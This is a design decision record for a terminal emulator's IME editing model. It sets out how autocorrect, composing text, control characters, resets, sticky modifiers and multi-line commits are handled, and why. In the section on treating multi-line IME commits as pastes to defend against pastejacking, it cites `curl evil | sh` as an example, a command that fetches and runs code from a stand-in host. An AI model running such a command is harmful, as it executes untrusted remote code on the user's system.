# The IME editing model

- Status: Approved
- Date: 2026-10-25
- Related: Requirements 5.3, 5.4, 6.1, and 8, [ime-contract.md](../design/ime-contract.md), section 8 of [compose-input.md](../design/compose-input.md), section 2 of [gate-policy.md](../design/gate-policy.md), [research/ime-languages.md](../research/ime-languages.md), [research/ime-gboard-device.md](../research/ime-gboard-device.md), [0084](0084-session-and-threads.md), [0085](0085-compose-interaction.md), [0087](0087-public-api.md), `ImeEditor` in `vtfx-input`, `TerminalSession`, `TerminalInputView`

## Background

Requirement 5.3 asks for Japanese input that works, for a way to send Latin letters one at a time, and for the matrix of target IMEs, the range of text disclosed to the IME, and the handling of rewrites of committed text to be decided (section 8 of the requirements). The IME is not trusted (requirement 6.1). [ime-contract.md](../design/ime-contract.md) defines the effect of each call: the IME edits an editing buffer of input history and composing text, and the edits are sent to the host as differences, which are right only while the input history matches what the host received (invariant 3) and the host's line is what the input history predicts. The contract leaves points that its text alone does not settle, or where following it literally is inconvenient; the topics below decide them.

## 1. Target IMEs and the text shown to the IME

1. Gboard's Japanese (QWERTY) and English are required, and checked by the spec tests (`spec/ime`); Gboard's Korean (두벌식) is for reports; Gboard's voice and handwriting input and other IMEs (Samsung Keyboard, SwiftKey, Simeji) are unverified, and checked on real devices (section 13 of [ime-contract.md](../design/ime-contract.md); who runs the checks, and when, is [0092](0092-device-checks-by-agents.md)).
2. The IME is shown only the input history (up to its limit) and the composing text, not the screen contents: option B of section 6 of [research/ime-languages.md](../research/ime-languages.md) (invariant 4 and section 13 of [ime-contract.md](../design/ime-contract.md)). Personalized learning is always disabled (section 3).
3. The input history is limited to 1024 code points, an argument of `ImeEditor`, and reset when it exceeds the limit (invariant 5 and section 11).

**Why.** Section 6 of [research/ime-languages.md](../research/ime-languages.md) compares what each option discloses and what it breaks. 1024 code points is long enough for a one-line command, and limiting the text shown to the IME also suits privacy (requirement 6.1).

**Impact of reversing.** To change the matrix, change the targets of `spec/ime` (owned by humans), the languages in `scripts/e2e_ime.py`, and section 13 of [ime-contract.md](../design/ime-contract.md). To change the limit, change `ImeEditor`, its tests in `ImeEditorTest`, and section 11.

## 2. Direct input

By default the IME is told `TYPE_CLASS_TEXT`. For IMEs that hold English words as composing text, the app can switch to direct input (`TerminalSession.directInput`), which tells the IME `VISIBLE_PASSWORD` and `NO_SUGGESTIONS` (sections 3 and 13 of [ime-contract.md](../design/ime-contract.md)).

**Why.** With `TYPE_CLASS_TEXT`, Gboard commits English one letter at a time, and Japanese and Korean conversion work. With IMEs that hold English words as composing text, apps that act on each key, like vim's normal mode, get nothing until the word is committed. Many IMEs offer no Japanese or Korean input with direct input, so the user switches depending on the situation.

**Alternatives considered.**
- **Always use `VISIBLE_PASSWORD`**: Japanese and Korean cannot be entered (section 3 of the contract).
- **Automatically switch to direct input on the alternate screen (vim, less, and so on)**: Japanese could no longer be entered in vim's insert mode. Whether on the alternate screen does not match whether in normal mode.
- **Send English composing text one character at a time**: it breaks invariant 2, that composing text is not sent, and cannot be distinguished from Japanese composing text.

**Impact of reversing.** To drop direct input, remove `TerminalSession.directInput` and the parameter of `TerminalInputConnection.configure` (a public API change).

## 3. The view the IME connects to

The IME connects to a `View` placed behind the terminal (`TerminalInputView`), which returns the `TerminalInputConnection` without Compose's wrapper, so that all IME calls arrive as the contract expects (section 12 of [ime-contract.md](../design/ime-contract.md)).

**Why.** Compose's `PlatformTextInputModifierNode` wraps the `InputConnection` in a `NullableInputConnectionWrapper`, which does not forward `replaceText` (API 34), so the interface's default implementation (select the range, then commit) runs instead. A `replaceText` within the range then becomes an append when the selection is rejected, and a `replaceText` outside the range becomes "`commitText` after a failed selection", so "do nothing if outside the range" (section 6.1) cannot be kept: an autocorrect arriving after a reset becomes an append of the corrected text. The view's coordinates match the grid, which also simplifies computing `CursorAnchorInfo`.

**Alternatives considered.**
- **Keep Compose's API and accept `setSelection` with any range**: `replaceText` within the range would become correct, but `replaceText` outside the range could not be rejected (the default implementation ignores the failure of `setSelection` and calls `commitText`).
- **Drop a `commitText` that follows a rejected `setSelection` in the same batch**: a guess that depends on the call order of the default implementation, and it may drop a legitimate `commitText`.

**Impact of reversing.** If Compose's wrapper starts forwarding `replaceText`, `TerminalInputView` can go back to `PlatformTextInputModifierNode`. In that case, check with `en-double-space` of the emulator e2e (`scripts/e2e_ime.py`) as well, and update section 12 of [ime-contract.md](../design/ime-contract.md).

## 4. Edits of committed text

1. Rewrites within the input history (autocorrect, choosing candidates, double-space period) are accepted, and the difference is sent as DELs and the text sent again (section 4.1 of [ime-contract.md](../design/ime-contract.md)). They take effect as expected on the host only while the host is in a line-editing state (section 4.3).
2. `setComposingRegion` accepts only ranges that end at the cursor; an empty range is treated as `finishComposingText` (sections 6.1 and 11).
3. `setSelection` accepts ranges that end at the cursor, and the next `commitText` or `setComposingText` replaces the selected text (section 6.1).
4. `replaceText` while there is composing text commits the composing text, then replaces the range; the result becomes the input history, unless it is a paste (topic 8) (section 11).
5. The part of `deleteSurroundingText` before the input history is sent as one DEL per UTF-16 code unit, up to the limit of the input history in total (sections 6.1 and 11).

**Why.**
- Making a range that does not end at the cursor into composing text would leave committed text after the composing text, breaking invariant 1. An empty range is handled as `BaseInputConnection` handles it.
- A selection that ends at the cursor keeps invariant 1 (no text after the cursor). Since topic 3, Gboard's path no longer selects to replace, but accepting such selections lets vtfx respond correctly to IMEs that replace by selecting and committing.
- `replaceText` is used to correct committed text (autocorrect, double-space period); no case in which the replaced range touches composing text has been observed.
- The content of the text before the input history is unknown, so it cannot be counted in code points. When an IME erases outside the range, it is in place of BS, and, as observed, one unit at a time.

**Alternatives considered.**
- **Accept ranges other than at the end in `setComposingRegion`, and hold the text after it as a continuation of the input history**: the buffer would become "history + composing + history", complicating the computation of differences and of the DELs sent. Not taken until a need is observed.

**Impact of reversing.** Change the corresponding methods of `ImeEditor`, the tests in `ImeEditorTest`, and sections 6.1 and 11 of [ime-contract.md](../design/ime-contract.md).

## 5. Control characters and HT

1. `ImeEditor` removes the control characters that are not sent (section 4.2 of [ime-contract.md](../design/ime-contract.md)) before they enter the editing buffer. The gate removes the same characters, and a test checks that the two rules agree (section 4.2).
2. A committed HT resets: HT in text, committed by the IME or sent by the app with `sendText`, is sent as is, and the input history is reset after sending text with HT (sections 4.2 and 5.1). HT in text without modifiers is sent as text, not as the Tab key, so the bytes do not change. An HT that takes sticky modifiers, and a character key of HT, also from the app's `sendKey`, are sent as the Tab key, since the key encoding drops a control character with modifiers (section 6.3, and section 8 of [compose-input.md](../design/compose-input.md)).
3. `TerminalSession.sendText` removes control characters without failing. It follows the rule of typed text (section 4.2, `ImeEditor.typeText`): line breaks are Enter, HT is kept, and the other control characters are removed. Its KDoc and section 5 of [usage.md](../usage.md) say so and point to `sendKey` for Esc and keys with Ctrl.

**Why.**
- Leaving removed characters in the editing buffer would make the input history longer than what reached the host (against invariant 3), and later differences would send DELs even for characters not sent, erasing the host's characters before the input history. The text shown to the IME also matches the host. Removing them only in the gate would need a path returning the gate's result to the editing model.
- The host receives the same byte for HT as for the Tab key, and a shell completes the word, so the input history no longer predicts its line, as section 5.1 says of Tab.
- Text from an app's settings or snippets may carry stray controls, and the same rule for every path of text keeps the input history matching what the host receives.
- The key encoding has the Tab and Enter keys with every modifier (Shift+Tab is `CSI Z`), so the modifiers that the user armed reach the host. The editing model and the session map the control to the key, rather than the gate's key encoding, which has no character for a control.

**Alternatives considered.**
- **Send every committed HT as the Tab key**: without modifiers the key encoding sends HT too, so this changes nothing but the shape of `HostInput`, and an HT within text would split it.
- **Make `sendText` reject text with control characters with `IllegalArgumentException`**: it fails fast, but an app that sends text from elsewhere would crash on a stray control, and Esc is a key, not text, for every other path.
- **Send an HT with sticky modifiers, or a character key of HT or a line break, as a character with the modifiers**: the key encoding drops a control character with modifiers, so a Tab typed after arming a modifier would send nothing and spend the modifiers.
- **Drop the modifiers and send the control as text**: the user's armed modifier would be ignored without a sign, and Shift+Tab, which full-screen apps use to move back, could not be typed with the keyboard's Tab.
- **Map a control character with modifiers to the Tab or Enter key in the gate's key encoding**: the gate would turn characters into keys for every caller, and the key encoding, which is under security review, would grow a rule that only the editing model and the session need.

**Impact of reversing.** Item 1: change `ImeEditor`, its tests, and section 4.2 of [ime-contract.md](../design/ime-contract.md). Item 2: remove the checks of HT from `ImeEditor.flush` and `ImeEditor.endOperation`, and revise `committedTabIsSentAndResetsLikeTheTabKey` and sections 4.1, 4.2, and 5.1. To stop sending the controls as the Tab and Enter keys, remove the mapping from `ImeEditor` and `TerminalSession`, revise `characterKeysOfHtAndLineBreaksAreTheTabAndEnterKeys` and `characterKeysOfHtAndLineBreaksInABatchEditAreSentAtOnce` in `ImeEditorTest`, and `stickyModifiersApplyToACommittedHtAsTheTabKey`, `stickyModifiersApplyToATypedHtAsTheTabKey`, and `characterKeysOfHtAndLineBreaksWithModifiersAreTheTabAndEnterKeys` in `TerminalSessionTest`, and update section 6.3 of [ime-contract.md](../design/ime-contract.md) and section 8 of [compose-input.md](../design/compose-input.md). Item 3: make `TerminalSession.sendText` reject control characters other than line breaks and HT, and revise `controlsInTheAppsTextAreRemoved` in `TerminalSessionTest`, its KDoc, and [usage.md](../usage.md).

## 6. Keys and mouse presses during composition

1. A character key while there is composing text commits the composing text and adds the character after it (sections 6.3 and 11 of [ime-contract.md](../design/ime-contract.md)).
2. BS or a non-character key while there is composing text, from the IME, a physical keyboard, or the app (`sendKey`), commits and sends the composing text, then sends the key (sections 6.3 and 11).
3. When a character key or BS commits the composing text, the input history is reset after the key is sent, so that the IME restarts and drops its composition (sections 5.1 and 6.3). This applies to `TerminalSession.sendText` too, which resets after sending in any case (topic 9). A character key without composing text does not reset (a character key of HT or a line break is the Tab or Enter key, which resets; topic 5 and section 6.3).
4. Key ups are all ignored; keys act on down (sections 6.3 and 11).
5. A mouse press reported with `TerminalSession.sendMouse` (wheel steps included) first commits and sends the composing text and resets, as a key does. Releases and motion do neither (section 5.1).

**Why.**
- Handling a character key literally "the same as `commitText`" would replace the composing text with the character, losing the user's input.
- The rule for non-character keys from an extra key bar is applied equally to keys from the IME and physical keyboards, and the order of sending matches the order of input.
- Without a reset, the IME, which was told nothing or only an updated selection, goes on composing the text that the host already received, and commits it again later (`か` composing, `x` from a key bar, then `な` sent `かxかな`). A character key without composing text does not reset, so that the IME can still correct what was typed one key at a time.
- Ignoring every up subsumes ignoring an up without a corresponding down, and needs no state to track the correspondence.
- A click reported to the host (vim in insert mode, for example) can move the host's cursor, so the input history no longer predicts the line, and the composing text typed before the click belongs before it. Motion comes in streams, also while the user composes text, and would keep committing it.

**Alternatives considered.**
- **Tell the IME with `updateSelection` only, from every path that commits composing text**: Gboard keeps its composition after an `updateSelection` that moves the composing region; only a restart reliably drops it. It also needs a path from the session's API to the view's connection.
- **Leave mouse reports out of the editing model**: the composing text would arrive after the click, at the new position, and a later correction would send DELs at that position.

**Impact of reversing.** Items 1, 2, and 4: change the corresponding methods of `ImeEditor`, the tests in `ImeEditorTest`, and section 11 of [ime-contract.md](../design/ime-contract.md); most traces in `spec/ime` go through the branch of key ups. Item 3: remove the reset from the key path of `ImeEditor.onKeyDown`, and revise its tests and section 6.3. Item 5: remove the call of `sendPendingInput` from `TerminalSession.sendMouse`, and revise its tests and section 5.1.

## 7. Resets during batch edits

A reset empties the input history at once, also during a batch edit of the IME and while there is composing text. The edits not sent yet are sent first, even during a batch edit, as a paste already does. The composing text stays. Only `restartInput` waits, until the batch edit ends and the composing text is gone. This applies to every reset, including the one after arming sticky modifiers (topic 10). See section 5.2 of [ime-contract.md](../design/ime-contract.md).

**Why.** A reset that waited for the end of the batch edit, or for the composing text to go, and kept the input history meanwhile let the edits that the IME made later be accepted against the old history; their difference sent DELs that erased the host's new prompt, the pasted text, or the text at the cursor after an arrow key. The edits not sent yet were made before the reset. The IME still has the composing text, and restarting would commit the composition. The edits that the IME makes after the reset apply to the empty history: a replacement of the old text is rejected as outside the edit buffer, and a deletion of it is sent as BS (section 6.1).

**Alternatives considered.**
- **Keep the pending reset and drop the edits that follow it in the batch**: the IME would think its edits were made, and the edit buffer that it sees would no longer be what vtfx holds.
- **Drop the edits not sent yet at the reset instead of sending them**: the user's committed text would be lost; sending it is what would have happened had the batch ended just before the reset.

**Impact of reversing.** Make `ImeEditor.requestReset` only mark the reset again, and revise the tests of resets during batch edits in `ImeEditorTest` and `TerminalSessionTest`, and `HostileIme.Host`, whose check of the host's line relies on the history being empty after a reset.

## 8. Text of several lines that the IME commits is a paste

1. Text that the IME commits (`commitText`, `replaceText`, and `commitCompletion`) is a paste if it has a line break (CR, LF, or CR LF) and is not a line feed alone, also with a single trailing line break, such as `curl evil | sh` followed by a line feed. The same holds for the composing text, whatever call commits it (section 4.2 of [ime-contract.md](../design/ime-contract.md)).
2. A paste replaces the composing text (or the selection) as the commit would, sends the edits not sent yet, even during a batch edit, then sends the text as `HostInput.Paste`, which the gate sends with `sendPaste`, bracketed if the host enabled bracketed paste, and resets the input history, as `performContextMenuAction(paste)` does (sections 4.2 and 6.4, and section 2 of [gate-policy.md](../design/gate-policy.md)).
3. A `replaceText` that is a paste deletes from the start of its range (or of the composing text, if the range starts after it) and pastes the replacement followed by the rest of the edit buffer (sections 4.2 and 6.1).
4. A line feed alone is the Enter key (section 11), except that a line feed alone that the IME commits after a paste in the same batch edit is a paste too, sent bracketed like the paste before it (section 4.2). The editing model keeps whether the batch edit in progress has sent a paste, and forgets it when the outermost batch edit ends or the connection closes.
5. A clipboard suggestion of one line and a line feed stays as it is: the line is typed, the line feed is Enter, and the line runs.
6. The app's `TerminalSession.sendText` is not an IME commit (topic 9). An app sends text from elsewhere with `TerminalSession.paste`.

**Why.**
- The most common way to paste on Android is to tap the clipboard suggestion that Gboard shows after a copy, which arrives as `commitText` with the clipboard's content. Treated as typing, each line break became the Enter key and the text was not bracketed, so text copied from a web page with a hidden line break and a command after it ran line by line, without the chance to look at it that bracketed paste gives the user in the shell. The same text pasted through the app's menu was bracketed.
- An IME commits Enter as a line feed alone, or as a key event or `performEditorAction`; typing does not commit text with a line break and other characters in one call. So the line break tells a paste from typing.
- Nothing can follow a paste in the edit buffer, so a `replaceText` that is a paste takes the rest of the buffer with it.
- A line feed alone is sent as the Enter key, not as text, so that what Enter sends (CR, or CR LF with LNM) is decided by the key encoding alone.
- Gboard commits a clipboard suggestion in two calls in one batch edit: the text up to its trailing line feed, then the line feed alone. As Enter, that line feed would run the pasted lines at once, which bracketed paste is there to prevent. The line feed need not directly follow the paste: Gboard does not commit Enter in the batch edit of a paste.
- For a suggestion of one line, the line is visible in the suggestion, and nothing hides in it the way lines after the first can.

**Alternatives considered.**
- **Treat only text with a line break before other characters as a paste**: a single trailing line break would still run the line at once, which is the classic case of pastejacking.
- **Treat long text as a paste**: the length does not tell whether the text runs commands; the line break does.
- **Treat a line feed alone that follows any commit in the same batch edit as a paste**: this would also bracket a suggestion of one line, but an IME that commits a word and Enter in one batch edit would then bracket every Enter, and the shell would not run the line.
- **Join the commits of a batch edit and decide at its end**: the editing model sends a paste at once, also during a batch edit (section 6.4), so it would hold pastes back and change when they reach the host.
- **Leave Gboard's trailing line feed as Enter**: the lines of a suggestion with a trailing line feed run without being looked at, which is the case item 1 is for.

**Impact of reversing.** Items 1 to 3: remove `isPaste` and its use from `ImeEditor.commit`, which `commitText`, `replaceText`, and every commit of the composing text go through, and revise the tests of committed text of several lines in `ImeEditorTest` and `TerminalSessionTest`, sections 4.2, 6.1, and 11 of [ime-contract.md](../design/ime-contract.md), and section 2 of [gate-policy.md](../design/gate-policy.md). Item 4: remove `pastedInBatch` from `ImeEditor` and its use in `ImeEditor.commit`, the tests of a line feed after a paste in `ImeEditorTest` and `TerminalSessionTest`, and the sentences on it in sections 4.2 and 11. To send a line feed alone otherwise than as the Enter key, change `ImeEditor.commit`, its tests in `ImeEditorTest`, and section 11; two of the Korean traces in `spec/ime` go through that branch.

## 9. Text from the app is typed and not shown to the IME

`TerminalSession.sendText` commits and sends the composing text, then sends its text, at once even during a batch edit of the IME, and then resets the input history, so the IME never sees the app's text. Each line break of the text is sent as Enter (`ImeEditor.typeText`). The reset restarts the IME only if the IME saw an edit since the last restart. See sections 1, 5.2, and 11 of [ime-contract.md](../design/ime-contract.md).

**Why.** Kept in the input history, the app's text could be read by the IME with `getTextBeforeCursor`, `getSurroundingText`, and `getExtractedText`, and in the next connection's initial surrounding text, until the next reset. Requirement 6.1 does not trust the IME, and an app may well send a saved password or a snippet with `sendText`. The text is sent at once because the app's call is not part of the IME's edit; added to the history during a batch edit, it reached the host only when the IME ended its batch. Line breaks are Enter because apps send commands with a trailing CR from their key bars (`git status` and CR). Restarting only after an edit keeps a key bar that sends text from restarting the IME on every tap while nothing is typed.

**Alternatives considered.**
- **Keep the text in the input history, so that the IME can correct it, and document that the IME sees it**: correcting the app's text is of little use, and an app would have to know not to send secrets with it.
- **Treat the app's text, or its text of several lines, as a paste**: commands with a trailing CR from a key bar would no longer run with bracketed paste enabled.

**Impact of reversing.** Make `ImeEditor.typeText` add the text to the history as `commitText` does, and revise `typedTextIsNotKeptInTheHistory` and the related tests in `ImeEditorTest` and `TerminalSessionTest`, the KDoc of `TerminalSession.sendText`, sections 1 and 11 of [ime-contract.md](../design/ime-contract.md), and [usage.md](../usage.md).

## 10. Sticky modifiers and the composing text

1. Arming sticky modifiers (setting `stickyModifiers` to modifiers that are not empty and differ from the current ones) first commits the composing text and sends it, with the edits not sent yet, without the new modifiers, as a key would before itself, and then always resets the input history. The modifiers then apply only to what is typed after arming, composing text included. Clearing them sends nothing. See section 8 of [compose-input.md](../design/compose-input.md) and section 6.3 of [ime-contract.md](../design/ime-contract.md).
2. The pending input is sent even during a batch edit of the IME, as a paste is, since the app's call is not part of the IME's edit; the reset follows topic 7.
3. The reset restarts the IME only if the IME saw an edit since the last restart (section 5.2 of [ime-contract.md](../design/ime-contract.md)).
4. If modifiers are already armed and the app adds another one, the composing text typed after the first takes the first.
5. A deletion that is part of an IME edit (`deleteSurroundingText`) sends plain DELs and leaves the modifiers armed; BS as `KEYCODE_DEL` takes them (section 8 of [compose-input.md](../design/compose-input.md)).

**Why.**
- The session applies the modifiers to the first character of the next text that the editing model sends, and cannot tell the composing text that an operation (a key, `sendText`, a paste) commits first from the text typed after arming. Without item 1, the composing text typed before arming took the modifier: with `cat` composing, Ctrl armed, and Left tapped, the host got Ctrl+C, `at`, and a plain Left. Composing text can also be typed after arming, for example with an IME that keeps a whole English word composing until a space, and that text must take the modifier.
- The IME can still edit the committed text it sees after arming: Gboard corrects the last word on a space or a candidate tap, and reconverts with `setComposingRegion`. The difference is DELs and the text sent again, whose first character would take the modifiers (typing `teh`, arming Ctrl, and taking the correction `the` sent `teh`, two DELs, and Ctrl+H; depending on the word, Ctrl+C or Ctrl+D). After the reset, a correction of the text typed before arming is rejected as outside the edit buffer. The reset also restarts the IME, which may still have the composing text that was just sent.
- Restarting only after an edit means that tapping Ctrl with nothing typed does not restart the IME every time, and arming after typing a word restarts it once.
- Composing text typed after the first modifier takes it as it would have when it was committed.
- A deletion with `deleteSurroundingText` is part of an IME edit, whose difference is DELs and text, not a key; sending it with modifiers would also change what the edit deletes. Since arming resets the input history, BS right after arming finds nothing for the IME to delete, and IMEs then send `KEYCODE_DEL`, which takes the modifiers. Only a deletion of text typed after arming is a plain DEL.

**Alternatives considered.**
- **Apply the modifiers only to the key or text of the operation itself, and send the text it commits first without them**: the composing text typed after arming (for example, a letter that Gboard keeps composing) would no longer take the modifier, which breaks Ctrl with such IMEs.
- **Remember how much text existed when the modifiers were armed, and apply them only to text beyond it**: the IME can edit that text afterwards (replace, reconvert, delete), so the boundary would have to follow the edits, and a correction that also adds a typed character (`teh` and a space corrected to `the `) would make it ambiguous; item 1 gets the same result without that state.
- **Never apply the modifiers to text that follows DELs in the same difference**: a correction is not always sent with DELs (an insertion is not), and text typed after arming inside the same batch would lose the modifier.
- **Apply the modifiers to the first DEL of an edit**: an edit can delete several characters for one key, and a replacement sends DELs that the user did not type.

**Impact of reversing.** Item 1: remove the call to `ImeEditor.sendPendingInput` from the setter of `TerminalSession.stickyModifiers` (and the method if unused), and revise `armingStickyModifiersSendsTheComposingTextWithoutThem` and the related tests in `TerminalSessionTest`, section 8 of [compose-input.md](../design/compose-input.md), and section 6.3 of [ime-contract.md](../design/ime-contract.md). To reset only with composing text, make `ImeEditor.sendPendingInput` reset only if there was composing text, and revise `pendingInputWithoutComposingTextResets` in `ImeEditorTest`, the tests of corrections after arming in `TerminalSessionTest`, and the same sections. Item 5: make `TerminalSession` apply the modifiers to `HostInput.Delete`, and revise section 8 of [compose-input.md](../design/compose-input.md).
